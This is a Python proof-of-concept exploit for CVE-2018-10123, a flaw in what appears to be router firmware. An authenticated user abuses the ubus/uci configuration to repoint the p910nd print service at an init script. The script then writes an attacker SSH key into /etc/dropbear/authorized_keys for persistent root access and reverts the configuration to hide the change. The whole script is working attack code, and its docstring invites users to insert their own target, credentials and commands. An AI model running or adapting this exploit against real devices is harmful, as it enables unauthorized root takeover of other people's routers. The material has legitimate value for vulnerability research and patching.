'''
Any authenticated user can modify the configuration for it in a way which allows them to read and append to any file as root. This leads to information disclosure and remote code execution. This vulnerability has been assigned the CVE ID: CVE-2018-10123.

This PoC requires Python 3.6 and a module called websocket-client which you can install by evoking pip install websocket-client. Please note that if you wish to use this, you should edit lines 58-61 of the script to include the proper IP, username, password and SSH key. You may also edit line 63 to include your own code for execution.
'''

#!/usr/bin/python3

import json
import sys
import socket
import os
import time
from websocket import create_connection

def ubusAuth(host, username, password):
    ws = create_connection("ws://" + host, header = ["Sec-WebSocket-Protocol: ubus-json"])
    req = json.dumps({"jsonrpc":"2.0","method":"call",
        "params":["00000000000000000000000000000000","session","login",
        {"username": username,"password":password}],
        "id":666})
    ws.send(req)
    response =  json.loads(ws.recv())
    ws.close()
    try:
        key = response.get('result')[1].get('ubus_rpc_session')
    except IndexError:
        return(None)
    return(key)

def ubusCall(host, key, namespace, argument, params={}):
    ws = create_connection("ws://" + host, header = ["Sec-WebSocket-Protocol: ubus-json"])
    req = json.dumps({"jsonrpc":"2.0","method":"call",
        "params":[key,namespace,argument,params],
        "id":666})
    ws.send(req)
    response =  json.loads(ws.recv())
    ws.close()
    try:
        result = response.get('result')[1]
    except IndexError:
        if response.get('result')[0] == 0:
            return(True)
        return(None)
    return(result)

def sendData(host, port, data=""):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(data.encode('utf-8'))
    s.shutdown(socket.SHUT_WR)
    s.close()
    return(None)

def recvData(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)
    s.shutdown(socket.SHUT_WR)
    s.close()
    return(data)

if __name__ == "__main__":
    host     = "192.168.1.1"
    username = "user"
    password = "user"
    key      = "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAkQMU/2HyXNEJ8gZbkxrvLnpSZ4Xz+Wf3QhxXdQ5blDI5IvDkoS4jHoi5XKYHevz8YiaX8UYC7cOBrJ1udp/YcuC4GWVV5TET449OsHBD64tgOSV+3s5r/AJrT8zefJbdc13Fx/Bnk+bovwNS2OTkT/IqYgy9n+fKKkSCjQVMdTTrRZQC0RpZ/JGsv2SeDf/iHRa71keIEpO69VZqPjPVFQfj1QWOHdbTRQwbv0MJm5rt8WTKtS4XxlotF+E6Wip1hbB/e+y64GJEUzOjT6BGooMu/FELCvIs2Nhp25ziRrfaLKQY1XzXWaLo4aPvVq05GStHmTxb+r+WiXvaRv1cbQ== rsa-key-20170427"
    payload  = ("""
    /bin/echo "%s" > /etc/dropbear/authorized_keys;
    """ % key)

    print("Authenticating...")
    key = ubusAuth(host, username, password)
    if (not key):
        print("Auth failed!")
        sys.exit(1)
    print("Got key: %s" % key)

    print("Enabling p910nd and setting up exploit...")
    pwn910nd = ubusCall(host, key, "uci", "set",
        {"config":"p910nd", "type":"p910nd", "values":
        {"enabled":"1", "interface":"lan", "port":"0",
        "device":"/etc/init.d/p910nd"}})
    if (not pwn910nd):
        print("Enabling p910nd failed!")
        sys.exit(1)

    print("Committing changes...")
    p910ndc = ubusCall(host, key, "uci", "commit",
        {"config":"p910nd"})
    if (not p910ndc):
        print("Committing changes failed!")
        sys.exit(1)

    print("Waiting for p910nd to start...")
    time.sleep(5)

    print("Sending key...")
    sendData(host, 9100, payload)

    print("Triggerring exploit...")
    print("Cleaning up...")

    dis910nd = ubusCall(host, key, "uci", "set",
        {"config":"p910nd", "type":"p910nd", "values":
        {"enabled":"0", "device":"/dev/usb/lp0"}})
    if (not dis910nd):
        print("Exploit and clean up failed!")
        sys.exit(1)

    p910ndc = ubusCall(host, key, "uci", "commit",
        {"config":"p910nd"})
    if (not p910ndc):
        print("Exploit and clean up failed!")
        sys.exit(1)

    print("Exploitation complete")